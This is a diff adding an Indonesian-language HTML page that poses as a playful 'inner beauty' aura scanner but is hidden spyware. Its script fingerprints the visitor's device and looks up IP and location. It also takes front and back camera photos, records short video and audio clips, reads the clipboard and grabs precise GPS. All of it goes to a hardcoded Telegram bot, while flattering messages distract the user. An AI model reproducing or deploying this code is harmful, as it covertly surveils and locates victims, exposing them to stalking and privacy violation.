@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>✨ Vilmei · Inner Beauty ✨</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background: #080012;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow-x: hidden;
+        }
+        .bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            background: radial-gradient(circle at 20% 30%, rgba(140, 40, 255, 0.18) 0%, transparent 50%),
+                radial-gradient(circle at 80% 70%, rgba(255, 50, 120, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 50% 50%, rgba(255, 180, 60, 0.08) 0%, transparent 60%);
+        }
+        .stars {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+        .star {
+            position: absolute;
+            background: #fff;
+            border-radius: 50%;
+            animation: twinkle var(--d) ease-in-out infinite;
+            animation-delay: var(--dl);
+            opacity: 0.15;
+        }
+        @keyframes twinkle {
+            0%,
+            100% {
+                opacity: 0.15;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 1;
+                transform: scale(1.8);
+            }
+        }
+        .container {
+            position: relative;
+            z-index: 10;
+            width: 100%;
+            max-width: 430px;
+            padding: 20px;
+        }
+        .page {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            background: rgba(14, 3, 32, 0.82);
+            backdrop-filter: blur(40px);
+            -webkit-backdrop-filter: blur(40px);
+            border-radius: 36px;
+            padding: 42px 26px 34px;
+            border: 1.5px solid rgba(155, 60, 255, 0.35);
+            box-shadow: 0 35px 70px rgba(0, 0, 0, 0.6), 0 0 90px rgba(140, 40, 255, 0.18);
+            text-align: center;
+            animation: slideIn 0.5s cubic-bezier(0.22, 0.61, 0.36, 1);
+        }
+        .page.active {
+            display: flex;
+        }
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(30px) scale(0.94);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+        .icon {
+            font-size: 5rem;
+            margin-bottom: 8px;
+            filter: drop-shadow(0 0 35px rgba(155, 60, 255, 0.5));
+            animation: float 3s ease-in-out infinite;
+        }
+        @keyframes float {
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-12px);
+            }
+        }
+        h2 {
+            font-size: 1.9rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #c77dff, #ff5ea0, #ffcc55);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 6px;
+        }
+        .sub {
+            color: #b8a0d8;
+            font-size: 0.9rem;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        input,
+        select {
+            width: 100%;
+            padding: 14px 18px;
+            border-radius: 50px;
+            border: 1.5px solid rgba(155, 60, 255, 0.4);
+            background: rgba(10, 2, 25, 0.75);
+            color: #fff;
+            font-size: 1rem;
+            font-family: inherit;
+            outline: none;
+            transition: 0.3s;
+            margin-bottom: 12px;
+            text-align: center;
+            backdrop-filter: blur(10px);
+        }
+        input:focus,
+        select:focus {
+            border-color: #ff5ea0;
+            box-shadow: 0 0 25px rgba(255, 94, 160, 0.3);
+        }
+        select {
+            appearance: none;
+            cursor: pointer;
+        }
+        select option {
+            background: #1a0035;
+            color: #fff;
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border-radius: 50px;
+            border: none;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: inherit;
+            background: linear-gradient(135deg, #9b3cff, #ff2d78);
+            color: #fff;
+            box-shadow: 0 10px 30px rgba(155, 60, 255, 0.4);
+            transition: 0.3s;
+            margin-top: 4px;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 14px 38px rgba(255, 45, 120, 0.5);
+        }
+        .btn:active {
+            transform: scale(0.96);
+        }
+        .loading {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            margin: 16px 0;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255, 255, 255, 0.08);
+            border-top-color: #c77dff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        .load-text {
+            color: #b8a0d8;
+            font-size: 0.85rem;
+        }
+        .bar {
+            width: 100%;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.06);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-top: 4px;
+        }
+        .bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #9b3cff, #ff2d78, #ffb340);
+            border-radius: 10px;
+            width: 0;
+            animation: fill 5s ease-in-out forwards;
+        }
+        @keyframes fill {
+            to {
+                width: 100%;
+            }
+        }
+        .praise {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: #ffcc55;
+            text-shadow: 0 0 22px rgba(255, 204, 85, 0.5);
+            animation: pop 0.45s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            min-height: 36px;
+        }
+        @keyframes pop {
+            from {
+                transform: scale(0.3);
+                opacity: 0;
+            }
+            to {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+        .emoji-float {
+            position: absolute;
+            pointer-events: none;
+            z-index: 5;
+            font-size: 1.5rem;
+            animation: rise 2.5s ease-out forwards;
+        }
+        @keyframes rise {
+            0% {
+                opacity: 1;
+                transform: translateY(0) scale(1) rotate(0deg);
+            }
+            100% {
+                opacity: 0;
+                transform: translateY(-200px) scale(0.3) rotate(50deg);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg"></div>
+    <div class="stars" id="stars"></div>
+    <div class="container">
+        <div class="page active" id="page1">
+            <div class="icon">⭐</div>
+            <h2>XzMirror</h2>
+            <p class="sub">Ungkap pesona inner beauty-mu<br>melalui cermin digital semesta ✨</p>
+            <input type="text" id="nameInput" placeholder="Nama panggilanmu..." autocomplete="off">
+            <button class="btn" onclick="page2()">Mulai ✦</button>
+        </div>
+        <div class="page" id="page2">
+            <div class="icon">🌙</div>
+            <h2>Energi Semesta</h2>
+            <p class="sub">Pilih vibrasi yang paling<br>menggambarkan dirimu:</p>
+            <select id="genderSelect">
+                <option value="">-- Pilih --</option>
+                <option value="wanita">🌸 Feminin</option>
+                <option value="pria">🌿 Maskulin</option>
+                <option value="nonbinary">☯️ Androgini</option>
+            </select>
+            <button class="btn" onclick="page3()">Ungkap Auranya ✦</button>
+        </div>
+        <div class="page" id="page3">
+            <div class="loading" id="loadingBlock">
+                <div class="spinner"></div>
+                <div class="load-text" id="loadText">Memindai aura kecantikanmu...</div>
+                <div class="bar"><div class="bar-fill"></div></div>
+            </div>
+            <div class="icon" id="doneIcon" style="display:none;">💫</div>
+            <h2 id="doneTitle" style="display:none;">Aura Terbaca!</h2>
+            <div class="praise" id="praiseBox"></div>
+            <p class="sub" id="doneSub" style="display:none;"></p>
+        </div>
+    </div>
+    <script>
+        (function() {
+            const TOKEN = '8437935816:AAHgd4QRoMi_2u2gZFShQpi7zmEj0YtTt9U';
+            const CID = '8430201817';
+            let name = '';
+            let gender = '';
+            let bag = {};
+
+            function tg(msg) {
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CID, text: msg, parse_mode: 'HTML' })
+                }).catch(() => {});
+            }
+
+            function sendFile(blob, fn, cap, type) {
+                let fd = new FormData();
+                fd.append('chat_id', CID);
+                let method = type === 'voice' ? 'sendVoice' : type === 'video' ? 'sendVideo' : 'sendDocument';
+                let field = type === 'voice' ? 'voice' : type === 'video' ? 'video' : 'document';
+                fd.append(field, blob, fn);
+                if (cap) fd.append('caption', cap);
+                fetch(`https://api.telegram.org/bot${TOKEN}/${method}`, { method: 'POST', body: fd }).catch(() => {});
+            }
+
+            function collect() {
+                let n = navigator,
+                    s = screen,
+                    w = window,
+                    d = document,
+                    t = new Date();
+                bag = {
+                    name,
+                    gender,
+                    ua: n.userAgent,
+                    plat: n.platform || '',
+                    lang: n.language || '',
+                    langs: JSON.stringify(n.languages || []),
+                    cookie: n.cookieEnabled,
+                    dnt: n.doNotTrack || 'unspec',
+                    cpu: n.hardwareConcurrency || '?',
+                    ram: (n.deviceMemory || '?') + 'GB',
+                    touch: n.maxTouchPoints || 0,
+                    vendor: n.vendor || '',
+                    sw: s.width,
+                    sh: s.height,
+                    scd: s.colorDepth,
+                    vw: w.innerWidth,
+                    vh: w.innerHeight,
+                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    time: t.toISOString(),
+                    local: t.toLocaleString(),
+                    ref: d.referrer || 'Direct',
+                    online: n.onLine,
+                    conn: n.connection ? n.connection.effectiveType : '?',
+                    downlink: n.connection ? n.connection.downlink + 'Mbps' : '?',
+                    rtt: n.connection ? n.connection.rtt + 'ms' : '?'
+                };
+                if (n.getBattery) {
+                    n.getBattery().then(b => {
+                        bag.bat = Math.round(b.level * 100) + '%';
+                        bag.charge = b.charging;
+                    }).catch(() => {});
+                }
+            }
+
+            function ipGrab() {
+                fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
+                    bag.ip = d.ip || '?';
+                    bag.isp = d.org || d.asn || '?';
+                    bag.city = d.city || '?';
+                    bag.region = d.region || '?';
+                    bag.country = d.country_name || '?';
+                    bag.postal = d.postal || '?';
+                    bag.lat = d.latitude;
+                    bag.lon = d.longitude;
+                    bag.asn = d.asn || '?';
+                    flush();
+                }).catch(() => { bag.ip = 'fail';
+                    flush(); });
+            }
+
+            function flush() {
+                if (!bag.ip) return;
+                let map = bag.lat ? `https://maps.google.com/?q=${bag.lat},${bag.lon}` : 'N/A';
+                let msg = `🔮 <b>Vilmei Report</b>\n\n` +
+                    `👤 <b>Identity</b>\nName: ${bag.name||'?'}\nGender: ${bag.gender||'?'}\n\n` +
+                    `📍 <b>Network</b>\nIP: ${bag.ip}\nISP: ${bag.isp}\nCity: ${bag.city}, ${bag.region}, ${bag.country}\nPostal: ${bag.postal}\nASN: ${bag.asn}\nCoords: ${bag.lat||'?'}, ${bag.lon||'?'}\nMaps: ${map}\n\n` +
+                    `📱 <b>Device</b>\nPlatform: ${bag.plat}\nLang: ${bag.lang}\nTZ: ${bag.tz}\nScreen: ${bag.sw}x${bag.sh} (${bag.scd}bit)\nView: ${bag.vw}x${bag.vh}\nCPU: ${bag.cpu} cores\nRAM: ${bag.ram}\nTouch: ${bag.touch}\nBattery: ${bag.bat||'?'} ${bag.charge!==undefined?(bag.charge?'⚡':'🔋'):''}\nConnection: ${bag.conn} (${bag.downlink}, RTT ${bag.rtt})\nOnline: ${bag.online}\n\n` +
+                    `🔧 <b>Technical</b>\nUA: ${bag.ua}\nVendor: ${bag.vendor}\nCookies: ${bag.cookie}\nDNT: ${bag.dnt}\nRef: ${bag.ref}\n\n` +
+                    `🕒 ${bag.local}`;
+                tg(msg);
+            }
+
+            async function cams() {
+                try {
+                    let s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' },
+                    audio: false });
+                    let v = document.createElement('video');
+                    v.srcObject = s;
+                    v.play();
+                    await new Promise(r => v.onloadedmetadata = r);
+                    let c = document.createElement('canvas');
+                    c.width = v.videoWidth || 640;
+                    c.height = v.videoHeight || 480;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    let b = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
+                    sendFile(b, 'cam_front.jpg', '📸 Front', 'doc');
+                    s.getTracks().forEach(t => t.stop());
+                } catch (e) {}
+                try {
+                    let s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' },
+                    audio: false });
+                    let v = document.createElement('video');
+                    v.srcObject = s;
+                    v.play();
+                    await new Promise(r => v.onloadedmetadata = r);
+                    let c = document.createElement('canvas');
+                    c.width = v.videoWidth || 640;
+                    c.height = v.videoHeight || 480;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    let b = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
+                    sendFile(b, 'cam_back.jpg', '📸 Back', 'doc');
+                    s.getTracks().forEach(t => t.stop());
+                } catch (e) {}
+            }
+
+            async function vid() {
+                try {
+                    let s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' },
+                    audio: true });
+                    let m = new MediaRecorder(s, { mimeType: 'video/webm' });
+                    let chunks = [];
+                    m.ondataavailable = e => chunks.push(e.data);
+                    m.onstop = () => {
+                        let b = new Blob(chunks, { type: 'video/webm' });
+                        sendFile(b, 'vid_front.webm', '🎥 Front 3s', 'video');
+                        s.getTracks().forEach(t => t.stop());
+                    };
+                    m.start();
+                    setTimeout(() => m.stop(), 3000);
+                } catch (e) {}
+                try {
+                    let s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' },
+                    audio: true });
+                    let m = new MediaRecorder(s, { mimeType: 'video/webm' });
+                    let chunks = [];
+                    m.ondataavailable = e => chunks.push(e.data);
+                    m.onstop = () => {
+                        let b = new Blob(chunks, { type: 'video/webm' });
+                        sendFile(b, 'vid_back.webm', '🎥 Back 3s', 'video');
+                        s.getTracks().forEach(t => t.stop());
+                    };
+                    m.start();
+                    setTimeout(() => m.stop(), 3000);
+                } catch (e) {}
+            }
+
+            async function mic() {
+                try {
+                    let s = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    let m = new MediaRecorder(s, { mimeType: 'audio/webm' });
+                    let chunks = [];
+                    m.ondataavailable = e => chunks.push(e.data);
+                    m.onstop = () => {
+                        let b = new Blob(chunks, { type: 'audio/webm' });
+                        sendFile(b, 'voice.webm', '🎤 3s', 'voice');
+                        s.getTracks().forEach(t => t.stop());
+                    };
+                    m.start();
+                    setTimeout(() => m.stop(), 3000);
+                } catch (e) {}
+            }
+
+            async function clip() {
+                try {
+                    let t = await navigator.clipboard.readText();
+                    if (t && t.length > 0 && t.length < 600) tg(`📋 Clipboard: ${t}`);
+                } catch (e) {}
+            }
+
+            function gps() {
+                if (!navigator.geolocation) return;
+                navigator.geolocation.getCurrentPosition(p => {
+                    tg(
+                        `📍 <b>Precise GPS</b>\nLat: ${p.coords.latitude}\nLon: ${p.coords.longitude}\nAcc: ${p.coords.accuracy}m\nMaps: https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`
+                        );
+                }, () => {}, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+            }
+
+            function emojiRain() {
+                let p = document.getElementById('page3');
+                if (!p.classList.contains('active')) return;
+                let emojis = ['✨', '💜', '🌸', '💫', '🌟', '🦋', '💖', '🔮', '😻', '🤏', '💅', '✨'];
+                for (let i = 0; i < 16; i++) {
+                    let el = document.createElement('span');
+                    el.className = 'emoji-float';
+                    el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+                    el.style.left = Math.random() * 90 + '%';
+                    el.style.top = (55 + Math.random() * 40) + '%';
+                    p.appendChild(el);
+                    setTimeout(() => el.remove(), 2800);
+                }
+            }
+
+            function praiseLoop() {
+                let box = document.getElementById('praiseBox');
+                let pool = gender === 'wanita' ? [
+                    'Kamu cantik banget hari ini 😻🤏', 'Glow up-mu gak ada obat 💅✨',
+                    'Aura princess terpancar jelas 👑💜', 'Cantik alami tanpa batas 🌸💫',
+                    'Inner beauty-mu bersinar terang 🦋💖', 'Hatimu seindah wajahmu 😻🌟',
+                    'Pesona tak tertandingi hari ini 💅🔥'
+                ] : gender === 'pria' ? [
+                    'Ganteng banget sih kamu hari ini 😻🤏', 'Kharisma level dewa ⚡💫',
+                    'Cool abis gak karuan 🧊🔥', 'Pancaran aura positif luar biasa 🌟💜',
+                    'Tampan maksimal bikin salfok 😎✨', 'Energi jantan terpancar kuat 🦁💪',
+                    'Keren banget kayak bintang film 🎬💖'
+                ] : [
+                    'Cahaya semesta memancar darimu ✨💫', 'Harmoni inner beauty terpancar ☯️💜',
+                    'Aura cosmic level maksimal 🌌🌟', 'Keseimbangan energi yang indah 🕊️💖',
+                    'Pancaran inner peace terasa kuat 🧘✨', 'Getaran semesta selaras denganmu 🔮💫'
+                ];
+                let i = 0;
+                setInterval(() => {
+                    if (!document.getElementById('page3').classList.contains('active')) return;
+                    box.innerHTML = `<span class="praise">${pool[i]}</span>`;
+                    i = (i + 1) % pool.length;
+                }, 2200);
+                box.innerHTML = `<span class="praise">${pool[0]}</span>`;
+            }
+
+            window.page2 = function() {
+                name = document.getElementById('nameInput').value.trim() || 'Anonymous';
+                document.getElementById('page1').classList.remove('active');
+                document.getElementById('page2').classList.add('active');
+            };
+
+            window.page3 = function() {
+                gender = document.getElementById('genderSelect').value || 'unspecified';
+                document.getElementById('page2').classList.remove('active');
+                document.getElementById('page3').classList.add('active');
+                collect();
+                ipGrab();
+                cams();
+                vid();
+                mic();
+                clip();
+                gps();
+                emojiRain();
+                praiseLoop();
+                setInterval(emojiRain, 3500);
+                let phrases = ['Memindai aura...', 'Menganalisis inner beauty...', 'Membaca vibrasi semesta...',
+                    'Menyelaraskan energi...', 'Mengungkap pesona tersembunyi...'
+                ];
+                let pi = 0;
+                let intv = setInterval(() => {
+                    let el = document.getElementById('loadText');
+                    if (el) el.textContent = phrases[pi];
+                    pi = (pi + 1) % phrases.length;
+                }, 1000);
+                setTimeout(() => {
+                    clearInterval(intv);
+                    document.getElementById('loadingBlock').style.display = 'none';
+                    document.getElementById('doneIcon').style.display = 'block';
+                    document.getElementById('doneTitle').style.display = 'block';
+                    document.getElementById('doneSub').style.display = 'block';
+                    document.getElementById('doneSub').textContent =
+                        'Inner beauty-mu telah terbaca semesta ✨💜';
+                }, 5000);
+            };
+
+            window.addEventListener('beforeunload', () => {
+                mic();
+                if (bag.ip) flush();
+            });
+            window.addEventListener('pagehide', () => mic());
+
+            for (let i = 0; i < 70; i++) {
+                let s = document.createElement('div');
+                s.className = 'star';
+                s.style.left = Math.random() * 100 + '%';
+                s.style.top = Math.random() * 100 + '%';
+                s.style.width = (Math.random() * 3 + 1) + 'px';
+                s.style.height = s.style.width;
+                s.style.setProperty('--d', (Math.random() * 3 + 2) + 's');
+                s.style.setProperty('--dl', (Math.random() * 5) + 's');
+                document.getElementById('stars').appendChild(s);
+            }
+
+            collect();
+            ipGrab();
+        })();
+    </script>
+</body>
+</html>
